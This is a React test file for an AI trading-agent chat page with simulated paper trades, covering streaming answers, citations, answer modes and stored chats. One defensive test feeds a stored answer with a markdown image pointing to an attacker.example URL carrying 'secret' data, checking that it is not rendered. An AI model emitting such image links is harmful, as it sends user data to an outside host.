import { act, fireEvent, screen, waitFor, within } from '@testing-library/react'
import { StrictMode } from 'react'
import { useLocation } from 'react-router'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { api, ApiError } from '../../lib/api'
import type { Card } from '../../lib/types'
import * as fx from '../../test/fixtures'
import { creditsUsed, currentPath, renderPage, sseFrame, sseStream, stubSession } from '../../test/utils'
import { AgentPage } from './AgentPage'
import { predictionEvent, predictionMarket, predictionBoard } from '../../test/predictions'
import { marketPrompt } from '../forecasts/PredictionMarkets'

const proposal: Card = {
  type: 'trade_proposal',
  data: { symbol: 'BTC', side: 'buy', notional: 500, price: 84000, stopLoss: 80000, takeProfit: 92000, rationale: 'Trend intact above the 50 SMA.' },
}
const outlookCard: Card = { type: 'price_outlook', data: fx.outlook }
const sourcesCard: Card = {
  type: 'sources',
  data: {
    items: [
      { n: 1, title: 'Bitcoin ETFs log a third day of inflows', url: 'https://www.reuters.com/markets/btc-etf', source: 'reuters.com', publishedAt: null },
      { n: 2, title: 'Fed holds', url: 'https://apnews.com/fed', source: 'AP', publishedAt: '2026-10-02T07:00:00Z' },
    ],
  },
}

let stream: ReturnType<typeof sseStream>
const sent = () => vi.mocked(fetch).mock.calls.map(([, init]) => JSON.parse((init as RequestInit).body as string))
const push = (event: string, data: unknown) => act(() => stream.push(sseFrame(event, data)))

function open(route = '/') {
  return renderPage(<AgentPage />, { route, path: '/', routes: { '/chat/:chatId': <AgentPage /> } })
}

async function ask(user: ReturnType<typeof open>['user'], text: string) {
  await user.type(screen.getByLabelText('Message the agent'), text)
  await user.keyboard('{Enter}')
}

beforeEach(() => {
  stubSession()
  vi.spyOn(api, 'chats').mockResolvedValue({ chats: [{ id: 'c0', title: 'Older chat', updatedAt: '2026-10-01T08:00:00Z' }] })
  vi.spyOn(api, 'brief').mockResolvedValue({ brief: fx.brief })
  vi.spyOn(api, 'getPulse').mockResolvedValue({ fearGreed: null }) // fetch is the chat stream's alone
  vi.mocked(fetch).mockImplementation(async (_url, init) => {
    stream = sseStream(init?.signal)
    return stream.response
  })
})

describe('AgentPage · welcome', () => {
  it('sends an account review chip once and renders all five ordinary read traces without executing an action', async () => {
    const order = vi.spyOn(api, 'placeOrder')
    const automation = vi.spyOn(api, 'createAlert')
    const { user } = open()
    await user.click(screen.getByRole('button', { name: 'Portfolio' }))
    await user.click(screen.getByRole('button', { name: 'Review my trades and suggest improvements' }))
    expect(sent()).toEqual([{ message: 'Review my trades and suggest improvements', mode: 'quality', lens: 'auto' }])
    await push('chat', { chatId: 'account-chat', title: 'Owned account review' })
    const reads = [
      ['get_trades', 'Reading your paper trades', 'Last 3 fills · 1 symbols'],
      ['get_pnl_attribution', 'Checking your P&L attribution', 'Since-reset P&L by source'],
      ['get_automations', 'Reviewing your automations', '3 active automations'],
      ['get_autopilots', 'Checking your autopilots', '1 paper autopilots'],
      ['get_ai_portfolios', 'Reviewing your AI portfolios', '1 invested AI portfolios'],
    ]
    for (const [name, label, summary] of reads) {
      await push('tool_call', { id: name, name, label: name, input: {} })
      expect(within(screen.getByRole('list', { name: 'Agent activity' })).getByText(label)).toBeInTheDocument()
      await push('tool_result', { id: name, name, ok: true, summary })
    }
    await push('delta', { text: 'Since-reset P&L $64.61. Selected 1d equity return 0.05% is a separate window. Holding is valid; no action is required.' })
    await push('done', { messageId: 'account-answer', credits: { ...fx.credits, used: 20 } })
    await user.click(screen.getByRole('button', { name: 'Show work' }))
    for (const [, , summary] of reads) expect(screen.getByText(`— ${summary}`)).toBeInTheDocument()
    expect(await screen.findByText(/Since-reset P&L \$64.61/)).toBeInTheDocument() // the answer is revealed, not pasted
    expect(screen.queryByRole('status', { name: 'Running' })).not.toBeInTheDocument()
    expect(screen.queryByRole('button', { name: /Confirm.*paper|Set automation|Set alert/ })).not.toBeInTheDocument()
    expect(order).not.toHaveBeenCalled(); expect(automation).not.toHaveBeenCalled()
    expect(creditsUsed()).toBe('20')
    expect(screen.getByLabelText('Message the agent')).toBeEnabled()
  })
  it('shows the headline, prompt ideas by topic, live tickers and the wire card', async () => {
    const { user } = open()
    expect(screen.getByRole('heading', { name: 'Which market is on your mind?' })).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /What's moving in crypto today/ })).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: 'Macro' }))
    expect(screen.getByRole('button', { name: /How is gold \(PAXG\) holding up/ })).toBeInTheDocument()

    const tickers = screen.getByRole('list', { name: 'Live prices' })
    await waitFor(() => expect(within(tickers).getByTitle('Ask about BTC')).toHaveTextContent('BTC$84,213.20▲up 2.3%'))

    const wire = await screen.findByRole('link', { name: 'Risk-on into the Fed' })
    expect(wire).toHaveAttribute('href', '/news')
    expect(screen.getByText('BTC ETF inflows extend')).toBeInTheDocument()
    expect(within(screen.getByRole('list', { name: 'Sentiment by asset' })).getAllByRole('listitem').map((li) => li.textContent)).toEqual([
      'BTC▲bullish',
      'PAXG▼bearish',
    ])
    expect(await screen.findByRole('link', { name: /Older chat/ })).toHaveAttribute('href', '/chat/c0')
  })

  it('sends a prompt idea as the message', async () => {
    const { user } = open()
    await user.click(screen.getByRole('button', { name: /Compare BTC, ETH and SOL momentum/ }))
    expect(sent()[0]).toEqual({ message: 'Compare BTC, ETH and SOL momentum in a table', mode: 'quality', lens: 'auto' })
  })

  it('hides the wire card when there is no brief', async () => {
    vi.spyOn(api, 'brief').mockResolvedValue({ brief: null })
    open()
    await screen.findByRole('link', { name: /Older chat/ })
    expect(screen.queryByRole('list', { name: 'Sentiment by asset' })).toBeNull()
    expect(screen.getByRole('button', { name: /What moved crypto today\? Cite sources\./ })).toBeInTheDocument()
  })
})

describe('AgentPage · streaming an answer', () => {
  it('renders tool chips, streamed markdown with [n] citations, cards and the trade confirm', async () => {
    const order = vi.spyOn(api, 'placeOrder').mockResolvedValue({
      trade: fx.trade({ symbol: 'BTC', qty: 0.005937, price: 84213.2, notional: 500, fee: 0.5, source: 'agent' }),
      portfolio: fx.portfolio,
    })
    const { user } = open()
    await screen.findByRole('link', { name: /Older chat/ })
    await ask(user, 'Should I buy BTC?')

    expect(sent()[0]).toEqual({ message: 'Should I buy BTC?', mode: 'quality', lens: 'auto' })
    const convo = screen.getByRole('list', { name: 'Conversation' })
    expect(within(convo).getByText('Should I buy BTC?')).toBeInTheDocument()
    expect(within(convo).getByRole('status')).toHaveTextContent('Thinking')
    expect(screen.getByRole('button', { name: 'Stop' })).toBeInTheDocument()

    await push('chat', { chatId: 'c1', title: 'Should I buy BTC?' })
    await waitFor(() => expect(currentPath()).toBe('/chat/c1'))
    expect(await screen.findByRole('link', { name: /Should I buy BTC\?/ })).toHaveAttribute('aria-current', 'page')

    await push('tool_call', { id: 'a', name: 'get_asset_analysis', label: 'Analyzing BTC (4h)', input: { symbol: 'BTC' } })
    const chips = await screen.findByRole('list', { name: 'Agent activity' })
    expect(within(chips).getByText('Analyzing BTC (4h)')).toBeInTheDocument()
    expect(within(chips).getByRole('status')).toHaveTextContent('Running')

    await push('tool_result', { id: 'a', name: 'get_asset_analysis', ok: true, summary: 'Uptrend, RSI 61' })
    await waitFor(() => expect(within(chips).queryByRole('status')).toBeNull())
    await user.click(screen.getByRole('button', { name: 'Show work' }))
    expect(screen.getByText('— Uptrend, RSI 61')).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: 'Hide work' }))

    await push('delta', { text: 'BTC is in an **uptrend** [1]. ' })
    await push('delta', { text: 'The Fed held [2].' })
    expect(await screen.findByText('uptrend', { selector: 'strong' })).toBeInTheDocument()
    await push('card', outlookCard)
    await push('card', sourcesCard)
    await push('card', proposal)
    await push('done', { messageId: 'm1', credits: { ...fx.credits, used: 20 } })

    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull())
    expect(creditsUsed()).toBe('20')

    // [n] marks link to the numbered sources, once the revealed text has caught up with the sources card
    const cite = await screen.findByRole('link', { name: '1' })
    expect(cite).toHaveAttribute('href', 'https://www.reuters.com/markets/btc-etf')
    expect(cite).toHaveAttribute('title', '1. Bitcoin ETFs log a third day of inflows (reuters.com)')
    expect(cite.parentElement?.tagName).toBe('SUP')
    const list = screen.getByRole('list', { name: 'Sources' })
    expect(within(list).getAllByRole('link').map((a) => a.getAttribute('href'))).toEqual(['https://www.reuters.com/markets/btc-etf', 'https://apnews.com/fed'])
    expect(screen.getByText('Sources · 2 · 2 cited')).toBeInTheDocument()

    // price outlook card
    expect(screen.getByText('BTC in 3 days')).toBeInTheDocument()
    expect(screen.getByText('$80.0k – $88.0k')).toBeInTheDocument()
    expect(screen.getByRole('link', { name: 'Open in Trade' })).toHaveAttribute('href', '/trade/BTC')

    // trade proposal → confirm places a paper order sourced to the agent
    expect(screen.getByText('Trend intact above the 50 SMA.')).toBeInTheDocument()
    expect(screen.getByLabelText('Amount (USD)')).toHaveValue('500')
    await user.click(screen.getByRole('button', { name: 'Confirm buy (paper)' }))
    expect(order).toHaveBeenCalledWith({ symbol: 'BTC', side: 'buy', notional: 500, stopLoss: 80000, takeProfit: 92000, source: 'agent' })
    expect(await screen.findByText('Filled 0.005937 BTC @ $84,213.20')).toBeInTheDocument()
    expect(screen.getByRole('link', { name: /View account/ })).toHaveAttribute('href', '/account')
    expect(screen.getAllByText('Filled 0.005937 BTC @ $84,213.20 (paper)').length).toBe(1) // toast
    expect(screen.getAllByText('Simulated · not financial advice').length).toBeGreaterThan(0)
  })

  it('stops a running answer and re-reads credits', async () => {
    const { user } = open()
    await ask(user, 'Long essay please')
    await push('delta', { text: 'Once upon a time' })
    await screen.findByText('Once upon a time')
    const meCalls = vi.mocked(api.me).mock.calls.length
    await user.click(screen.getByRole('button', { name: 'Stop' }))
    expect(screen.getByText('Stopped here. The full answer is saved to this chat when it finishes.')).toBeInTheDocument()
    expect(vi.mocked(api.me).mock.calls.length).toBe(meCalls + 1)
    expect(screen.getByRole('button', { name: 'Send message' })).toBeInTheDocument()
  })

  it('stops with Escape from the composer', async () => {
    const { user } = open()
    await ask(user, 'First')
    await push('chat', { chatId: 'c1', title: 'First' })
    await waitFor(() => expect(currentPath()).toBe('/chat/c1'))
    await user.click(screen.getByLabelText('Message the agent'))
    await user.keyboard('{Escape}')
    expect(await screen.findByText('Stopped here. The full answer is saved to this chat when it finishes.')).toBeInTheDocument()
  })

  it('shows the friendly quota error without a retry', async () => {
    const { user } = open()
    await ask(user, 'Hi')
    await push('error', { code: 'ai_quota', message: 'Daily AI credits used up' })
    const alert = await screen.findByRole('alert')
    expect(alert).toHaveTextContent('Daily AI credits used up')
    expect(alert).toHaveTextContent("Credits reset at 00:00 UTC. Charts, backtests and paper trading don't use credits.")
    expect(within(alert).queryByRole('button', { name: 'Retry' })).toBeNull()
  })

  it('retries a failed answer with the same message', async () => {
    const { user } = open()
    await ask(user, 'What about ETH?')
    await push('error', { code: 'upstream', message: 'Model unavailable' })
    const alert = await screen.findByRole('alert')
    expect(alert).toHaveTextContent("The desk couldn't reach its data")
    await user.click(within(alert).getByRole('button', { name: 'Retry' }))
    expect(sent()).toEqual([{ message: 'What about ETH?', mode: 'quality', lens: 'auto' }, { message: 'What about ETH?', mode: 'quality', lens: 'auto' }])
    expect(screen.getAllByText('What about ETH?')).toHaveLength(1) // the failed pair is replaced
  })

  it('keeps the conversation going in the same chat', async () => {
    const { user } = open()
    await ask(user, 'One')
    await push('chat', { chatId: 'c1', title: 'One' })
    await push('done', { messageId: 'm1', credits: fx.credits })
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Stop' })).toBeNull())
    await ask(user, 'Two')
    expect(sent()[1]).toEqual({ chatId: 'c1', message: 'Two', mode: 'quality', lens: 'auto' })
  })

  it('reveals a live answer gradually, at exactly the streamed text', async () => {
    const { user } = open()
    await ask(user, 'Long answer please')
    const answer = 'BTC holds its 4h uptrend above the 20 EMA; ETF inflows continue for a third day. '.repeat(4) + '**View:** bullish.'
    await push('delta', { text: answer })
    expect(screen.queryByText('bullish.', { exact: false })).toBeNull() // the burst is not pasted in at once
    await push('done', { messageId: 'm1', credits: fx.credits })
    const convo = screen.getByRole('list', { name: 'Conversation' })
    await waitFor(() => expect(convo.querySelector('.md')?.textContent).toBe(answer.replaceAll('**', '')))
    expect(within(convo).getByText('View:', { selector: 'strong' })).toBeInTheDocument()
  })

  it('follows the revealed answer down unless the reader scrolled up', async () => {
    const observers: (() => void)[] = []
    vi.stubGlobal('ResizeObserver', class {
      constructor(cb: () => void) { observers.push(cb) }
      observe() {}
      disconnect() {}
    })
    const { user } = open()
    await ask(user, 'Scroll with me')
    const scroller = screen.getByRole('list', { name: 'Conversation' }).closest<HTMLDivElement>('.overflow-y-auto')!
    Object.defineProperties(scroller, { scrollHeight: { value: 2000, configurable: true }, clientHeight: { value: 500, configurable: true }, scrollTop: { value: 0, writable: true } })
    observers.forEach((grew) => grew()) // the revealed text grew between page renders
    expect(scroller.scrollTop).toBe(2000)
    scroller.scrollTop = 600
    fireEvent.scroll(scroller) // the reader scrolled up
    observers.forEach((grew) => grew())
    expect(scroller.scrollTop).toBe(600)
  })

  it('offers a jump to the latest message after scrolling up', async () => {
    const { user } = open()
    await ask(user, 'Scroll test')
    const scroller = screen.getByRole('list', { name: 'Conversation' }).closest<HTMLDivElement>('.overflow-y-auto')!
    Object.defineProperties(scroller, { scrollHeight: { value: 2000, configurable: true }, clientHeight: { value: 500, configurable: true } })
    scroller.scrollTop = 0
    fireEvent.scroll(scroller)
    const latest = screen.getByRole('button', { name: 'Latest' })
    const scrollTo = vi.spyOn(scroller, 'scrollTo')
    await user.click(latest)
    expect(scrollTo).toHaveBeenCalledWith({ top: 2000, behavior: 'smooth' })
  })
})

describe('AgentPage · answer mode', () => {
  it('defaults to Quality and includes it in a typed message request', async () => {
    const { user } = open()
    expect(screen.getByRole('combobox', { name: 'Answer mode' })).toHaveValue('quality')
    expect(screen.getByRole('combobox', { name: 'Answer mode' })).toHaveAccessibleDescription('Thorough explanations and structured insights')
    await ask(user, 'Explain BTC momentum')
    expect(sent()[0]).toEqual({ message: 'Explain BTC momentum', mode: 'quality', lens: 'auto' })
  })

  it('uses Fast for suggested prompts and keeps the choice fixed during streaming', async () => {
    const { user } = open()
    await user.selectOptions(screen.getByRole('combobox', { name: 'Answer mode' }), 'fast')
    expect(screen.getByRole('combobox', { name: 'Answer mode' })).toHaveAccessibleDescription('Clear, concise answers with fewer steps')
    await user.click(screen.getByRole('button', { name: /Compare BTC, ETH and SOL momentum/ }))
    expect(sent()[0]).toEqual({ message: 'Compare BTC, ETH and SOL momentum in a table', mode: 'fast', lens: 'auto' })
    const mode = screen.getByRole('combobox', { name: 'Answer mode' })
    expect(mode).toHaveValue('fast')
    expect(mode).toBeDisabled()
    await user.selectOptions(mode, 'quality')
    expect(mode).toHaveValue('fast')

    await push('chat', { chatId: 'c1', title: 'Momentum' })
    await push('delta', { text: 'BTC is leading.' })
    await push('card', { type: 'followups', data: { prompts: ['What would change your view?'] } })
    await push('done', { messageId: 'm1', credits: fx.credits })
    await waitFor(() => expect(mode).toBeEnabled())
    await user.click(await screen.findByRole('button', { name: 'What would change your view?' })) // after the reveal
    expect(sent()[1]).toEqual({ chatId: 'c1', message: 'What would change your view?', mode: 'fast', lens: 'auto' })
  })

  it('remembers the selected mode when the agent page is reopened', async () => {
    const first = open()
    await first.user.selectOptions(screen.getByRole('combobox', { name: 'Answer mode' }), 'fast')
    first.unmount()
    const { user } = open()
    expect(screen.getByRole('combobox', { name: 'Answer mode' })).toHaveValue('fast')
    await ask(user, 'A quick market brief')
    expect(sent()[0]).toEqual({ message: 'A quick market brief', mode: 'fast', lens: 'auto' })
  })

  it('falls back to Quality when the saved mode is invalid', () => {
    localStorage.setItem('agent-answer-mode', 'unknown')
    open()
    expect(screen.getByRole('combobox', { name: 'Answer mode' })).toHaveValue('quality')
  })

  it('still lets the user select and send when browser storage is blocked', async () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => { throw new Error('Storage blocked') })
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => { throw new Error('Storage blocked') })
    const { user } = open()
    expect(screen.getByRole('combobox', { name: 'Answer mode' })).toHaveValue('quality')
    await user.selectOptions(screen.getByRole('combobox', { name: 'Answer mode' }), 'fast')
    await ask(user, 'A brief answer please')
    expect(sent()[0]).toEqual({ message: 'A brief answer please', mode: 'fast', lens: 'auto' })
  })

  it('uses the newly selected mode when retrying a failed answer', async () => {
    const { user } = open()
    await ask(user, 'What about ETH?')
    await push('error', { code: 'upstream', message: 'Model unavailable' })
    const alert = await screen.findByRole('alert')
    await user.selectOptions(screen.getByRole('combobox', { name: 'Answer mode' }), 'fast')
    await user.click(within(alert).getByRole('button', { name: 'Retry' }))
    expect(sent()).toEqual([
      { message: 'What about ETH?', mode: 'quality', lens: 'auto' },
      { message: 'What about ETH?', mode: 'fast', lens: 'auto' },
    ])
  })

  it('defaults the lens to Auto and sends the chosen lens with every message, next to the mode', async () => {
    const { user } = open()
    const lens = screen.getByRole('combobox', { name: 'Answer lens' })
    expect(lens).toHaveValue('auto')
    expect(lens).toHaveAccessibleDescription('Reads each question as an investor, a trader or both')
    expect(within(lens).getAllByRole('option').map((o) => o.textContent)).toEqual(['Lens: Auto', 'Lens: Investor', 'Lens: Trader'])
    await user.selectOptions(lens, 'investor')
    expect(lens).toHaveAccessibleDescription('Long-term view: thesis, valuation and scenario odds over years')
    await ask(user, 'Is NVDA a 10-year hold?')
    expect(sent()[0]).toEqual({ message: 'Is NVDA a 10-year hold?', mode: 'quality', lens: 'investor' })
    expect(screen.getByRole('combobox', { name: 'Answer lens' })).toBeDisabled()
    await user.selectOptions(screen.getByRole('combobox', { name: 'Answer lens' }), 'trader')
    expect(screen.getByRole('combobox', { name: 'Answer lens' })).toHaveValue('investor') // fixed while streaming

    await push('chat', { chatId: 'c1', title: 'NVDA' })
    await push('done', { messageId: 'm1', credits: fx.credits })
    await waitFor(() => expect(screen.getByRole('combobox', { name: 'Answer lens' })).toBeEnabled())
    await user.selectOptions(screen.getByRole('combobox', { name: 'Answer lens' }), 'trader')
    expect(screen.getByRole('combobox', { name: 'Answer lens' })).toHaveAccessibleDescription('Setups: entry, stop, target and reward:risk over hours to weeks')
    await ask(user, 'Entry for today?')
    expect(sent()[1]).toEqual({ chatId: 'c1', message: 'Entry for today?', mode: 'quality', lens: 'trader' })
  })

  it('remembers the lens when the agent page is reopened and falls back to Auto on a bad saved value', async () => {
    const first = open()
    await first.user.selectOptions(screen.getByRole('combobox', { name: 'Answer lens' }), 'trader')
    expect(localStorage.getItem('agent-answer-lens')).toBe('trader')
    first.unmount()
    const { user, unmount } = open()
    expect(screen.getByRole('combobox', { name: 'Answer lens' })).toHaveValue('trader')
    await ask(user, 'A quick market brief')
    expect(sent()[0]).toEqual({ message: 'A quick market brief', mode: 'quality', lens: 'trader' })
    unmount()
    localStorage.setItem('agent-answer-lens', 'hybrid')
    open()
    expect(screen.getByRole('combobox', { name: 'Answer lens' })).toHaveValue('auto')
  })

  it('still lets the user choose a lens and send when browser storage is blocked', async () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => { throw new Error('Storage blocked') })
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => { throw new Error('Storage blocked') })
    const { user } = open()
    expect(screen.getByRole('combobox', { name: 'Answer lens' })).toHaveValue('auto')
    await user.selectOptions(screen.getByRole('combobox', { name: 'Answer lens' }), 'investor')
    await ask(user, 'Worth holding TSM?')
    expect(sent()[0]).toEqual({ message: 'Worth holding TSM?', mode: 'quality', lens: 'investor' })
  })

  it('opens Strategy Studio and Workflow from either composer', async () => {
    const { user } = open()
    expect(screen.getByRole('link', { name: 'Strategy Studio' })).toHaveAttribute('href', '/strategies')
    expect(screen.getByRole('link', { name: 'Workflow' })).toHaveAttribute('href', '/automations')
    await ask(user, 'Hi')
    expect(screen.getByRole('link', { name: 'Strategy Studio' })).toHaveAttribute('href', '/strategies')
    expect(screen.getByRole('link', { name: 'Workflow' })).toHaveAttribute('href', '/automations')
  })
})

describe('AgentPage · composer', () => {
  it('Shift+Enter adds a line; Enter sends the trimmed text', async () => {
    const { user } = open()
    const box = screen.getByLabelText('Message the agent')
    await user.type(box, '  line one{Shift>}{Enter}{/Shift}line two  ')
    expect(box).toHaveValue('  line one\nline two  ')
    expect(fetch).not.toHaveBeenCalled()
    await user.click(screen.getByRole('button', { name: 'Send message' }))
    expect(sent()[0]).toEqual({ message: 'line one\nline two', mode: 'quality', lens: 'auto' })
    expect(screen.getByLabelText('Message the agent')).toHaveValue('') // the conversation's composer starts empty
  })

  it('blocks messages over 4,000 characters', async () => {
    const { user } = open()
    const box = screen.getByLabelText('Message the agent')
    expect(screen.getByRole('button', { name: 'Send message' })).toBeDisabled() // empty
    await user.click(box)
    await user.paste('x'.repeat(4001))
    expect(box).toHaveAttribute('aria-invalid', 'true')
    expect(screen.getByText('4,001 / 4,000')).toBeInTheDocument()
    expect(screen.getByRole('button', { name: 'Send message' })).toBeDisabled()
    await user.keyboard('{Enter}')
    expect(fetch).not.toHaveBeenCalled()
  })
})

describe('AgentPage · stored chats', () => {
  it('loads a chat with its cards', async () => {
    const get = vi.spyOn(api, 'chat').mockResolvedValue({
      chat: {
        id: 'c0',
        title: 'Older chat',
        messages: [
          { id: 'm1', role: 'user', attachments: [], content: 'Outlook for BTC?', cards: [], createdAt: '' },
          { id: 'm2', role: 'assistant', attachments: [], content: 'Here is the **outlook**.', cards: [outlookCard], createdAt: '' },
        ],
      },
    })
    open('/chat/c0')
    expect(await screen.findByText('Outlook for BTC?')).toBeInTheDocument()
    expect(get).toHaveBeenCalledWith('c0', expect.any(AbortSignal))
    expect(screen.getByText('outlook', { selector: 'strong' })).toBeInTheDocument()
    expect(screen.getByText('BTC in 3 days')).toBeInTheDocument()
    expect(await screen.findByRole('link', { name: /Older chat/ })).toHaveAttribute('aria-current', 'page')
    expect(screen.getByRole('heading', { level: 1, name: 'Older chat' })).toBeInTheDocument()
  })

  describe('an answer still being generated', () => {
    const question = { id: 'm1', role: 'user' as const, attachments: [], content: 'Size a trade in AVAX for my account', cards: [], createdAt: '' }
    const answer = { id: 'm2', role: 'assistant' as const, attachments: [], content: 'Keep it to **$1,500**.', cards: [], createdAt: '' }
    const chat = (pending: boolean) => ({ chat: { id: 'c0', title: 'Older chat', messages: pending ? [question] : [question, answer], pending } })
    afterEach(() => {
      vi.useRealTimers()
    })

    it('shows "Still working" with the composer locked, then the stored answer once the chat stops pending', async () => {
      vi.useFakeTimers()
      // Pending for the load and the first re-read; the third call (the 2 s poll) has the answer.
      const get = vi.spyOn(api, 'chat').mockImplementation(async () => chat(get.mock.calls.length < 3))
      open('/chat/c0')
      await act(async () => {})
      expect(screen.getByText('Size a trade in AVAX for my account')).toBeInTheDocument()
      expect(screen.getByRole('status')).toHaveTextContent('Still working on this answer…')
      expect(screen.getByRole('combobox', { name: 'Answer mode' })).toBeDisabled()
      expect(screen.getByRole('button', { name: 'Stop' })).toBeInTheDocument() // no Send while it runs

      await act(() => vi.advanceTimersByTimeAsync(2000))
      expect(get).toHaveBeenCalledTimes(3)
      expect(screen.getByText('$1,500', { selector: 'strong' })).toBeInTheDocument()
      expect(screen.queryByText('Still working on this answer…')).toBeNull()
      expect(screen.getByRole('button', { name: 'Send message' })).toBeInTheDocument()
      await act(() => vi.advanceTimersByTimeAsync(6000))
      expect(get).toHaveBeenCalledTimes(3) // polling stopped
    })

    it('gives up after 150 polls with a Retry', async () => {
      vi.useFakeTimers()
      const get = vi.spyOn(api, 'chat').mockImplementation(async () => chat(true))
      open('/chat/c0')
      await act(async () => {})
      await act(() => vi.advanceTimersByTimeAsync(150 * 2000))
      const alert = screen.getByRole('alert')
      expect(alert).toHaveTextContent("This answer didn't finish. Ask again.")
      expect(within(alert).getByRole('button', { name: 'Retry' })).toBeInTheDocument()
      expect(get).toHaveBeenCalledTimes(151) // the load and 150 re-reads
    })

    it('Stop ends the wait locally', async () => {
      vi.spyOn(api, 'chat').mockResolvedValue(chat(true))
      const { user } = open('/chat/c0')
      await user.click(await screen.findByRole('button', { name: 'Stop' }))
      expect(screen.getByText('Stopped here. The full answer is saved to this chat when it finishes.')).toBeInTheDocument()
      expect(screen.queryByText('Still working on this answer…')).toBeNull()
    })
  })

  it('keeps the desk brief when a chat opened from a forecast is reopened', async () => {
    const forecast: Card = {
      type: 'forecast',
      data: { id: 'f9', question: 'BTC above $86,000 on Oct 7?', shape: 'binary', headline: { outcome: 'Yes', p: 0.36 }, resolutionDate: '2026-10-07' },
    }
    vi.spyOn(api, 'chat').mockResolvedValue({
      chat: {
        id: 'c0',
        title: 'Older chat',
        messages: [
          { id: 'm1', role: 'user', attachments: [], content: 'Trade the desk view?', cards: [], createdAt: '' },
          { id: 'm2', role: 'assistant', attachments: [], content: 'The desk leans No.', cards: [forecast], createdAt: '' },
        ],
      },
    })
    const { user } = open('/chat/c0')
    expect(await screen.findByText('The desk leans No.')).toBeInTheDocument()
    await ask(user, 'Short it then?')
    expect(sent()[0]).toEqual({ chatId: 'c0', message: 'Short it then?', mode: 'quality', lens: 'auto', context: { forecastId: 'f9' } })
  })

  it('never renders an image from a stored cited answer', async () => {
    vi.spyOn(api, 'chat').mockResolvedValue({
      chat: {
        id: 'c0',
        title: 'Older chat',
        messages: [
          { id: 'm1', role: 'user', attachments: [], content: 'News?', cards: [], createdAt: '' },
          { id: 'm2', role: 'assistant', attachments: [], content: 'ETFs bought [1].\n\n![](https://attacker.example/p.png?d=secret)', cards: [sourcesCard], createdAt: '' },
        ],
      },
    })
    open('/chat/c0')
    expect(await screen.findByRole('link', { name: '1' })).toHaveAttribute('href', 'https://www.reuters.com/markets/btc-etf')
    expect(document.querySelector('img, [href*="attacker.example"], [src*="attacker.example"]')).toBeNull()
  })

  it("says so when the chat isn't there, and starts a new one", async () => {
    vi.spyOn(api, 'chat').mockRejectedValue(new ApiError(404, 'not_found', 'Not found'))
    const { user } = open('/chat/gone')
    expect(await screen.findByRole('heading', { name: "This chat isn't here." })).toBeInTheDocument()
    await user.click(screen.getByRole('button', { name: 'Start a new chat' }))
    expect(currentPath()).toBe('/')
    expect(screen.getByRole('heading', { name: 'Which market is on your mind?' })).toBeInTheDocument()
  })

  it('retries a chat that failed to load', async () => {
    const get = vi.spyOn(api, 'chat').mockRejectedValueOnce(new ApiError(0, 'network', 'Cannot reach the server.'))
    get.mockResolvedValueOnce({ chat: { id: 'c0', title: 'Older chat', messages: [{ id: 'm1', role: 'user', attachments: [], content: 'Back again', cards: [], createdAt: '' }] } })
    const { user } = open('/chat/c0')
    const alert = await screen.findByRole('alert')
    expect(alert).toHaveTextContent('Connection lost')
    await user.click(within(alert).getByRole('button', { name: 'Retry' }))
    expect(await screen.findByText('Back again')).toBeInTheDocument()
  })

  it('shows a retry when the chat list fails', async () => {
    const list = vi.spyOn(api, 'chats').mockRejectedValueOnce(new ApiError(500, 'internal', "Couldn't load your chats."))
    const { user } = open()
    const nav = screen.getAllByRole('navigation', { name: 'Chat history' })[0]
    expect(await within(nav).findByText("Couldn't load your chats.")).toBeInTheDocument()
    list.mockResolvedValueOnce({ chats: [] })
    await user.click(within(nav).getByRole('button', { name: 'Try again' }))
    expect(await within(nav).findByText('No chats yet. Ask a question to start one.')).toBeInTheDocument()
  })

  it('deletes a chat after an inline confirm', async () => {
    const del = vi.spyOn(api, 'deleteChat').mockResolvedValue(undefined)
    vi.spyOn(api, 'chat').mockResolvedValue({ chat: { id: 'c0', title: 'Older chat', messages: [] } })
    const { user } = open('/chat/c0')
    const nav = screen.getAllByRole('navigation', { name: 'Chat history' })[0]
    await user.click(await within(nav).findByRole('button', { name: 'Delete chat: Older chat' }))
    expect(within(nav).getByText('Delete this chat?')).toBeInTheDocument()
    await user.click(within(nav).getByRole('button', { name: 'Cancel' }))
    await user.click(within(nav).getByRole('button', { name: 'Delete chat: Older chat' }))
    await user.click(within(nav).getByRole('button', { name: 'Delete' }))
    expect(del).toHaveBeenCalledWith('c0')
    expect(await screen.findByText('Chat deleted')).toBeInTheDocument()
    expect(within(nav).queryByText('Older chat')).toBeNull()
    await waitFor(() => expect(currentPath()).toBe('/')) // the open chat was the one deleted; navigations are transitions
  })

  it('toasts when a delete fails and keeps the row', async () => {
    vi.spyOn(api, 'deleteChat').mockRejectedValue(new ApiError(500, 'internal', "Couldn't delete the chat."))
    const { user } = open()
    const nav = screen.getAllByRole('navigation', { name: 'Chat history' })[0]
    await user.click(await within(nav).findByRole('button', { name: 'Delete chat: Older chat' }))
    await user.click(within(nav).getByRole('button', { name: 'Delete' }))
    expect(await screen.findByRole('alert')).toHaveTextContent("Couldn't delete the chat.")
    expect(within(nav).getByText('Older chat')).toBeInTheDocument()
  })

  it('starts a new chat from the history column', async () => {
    vi.spyOn(api, 'chat').mockResolvedValue({ chat: { id: 'c0', title: 'Older chat', messages: [{ id: 'm', role: 'user', attachments: [], content: 'old', cards: [], createdAt: '' }] } })
    const { user } = open('/chat/c0')
    await screen.findByText('old')
    await user.click(screen.getAllByRole('button', { name: 'New chat' })[0])
    expect(currentPath()).toBe('/')
    expect(screen.queryByText('old')).toBeNull()
  })
})

describe('AgentPage · trade proposal card', () => {
  async function withProposal(card: Card = proposal) {
    vi.spyOn(api, 'chat').mockResolvedValue({
      chat: { id: 'c0', title: 'Older chat', messages: [{ id: 'm2', role: 'assistant', attachments: [], content: 'Here is a trade.', cards: [card], createdAt: '' }] },
    })
    const r = open('/chat/c0')
    await screen.findByText('Here is a trade.')
    return r
  }

  it('validates the amount against the $10 minimum', async () => {
    const order = vi.spyOn(api, 'placeOrder')
    const { user } = await withProposal()
    await screen.findByText('Bitcoin') // live price loaded
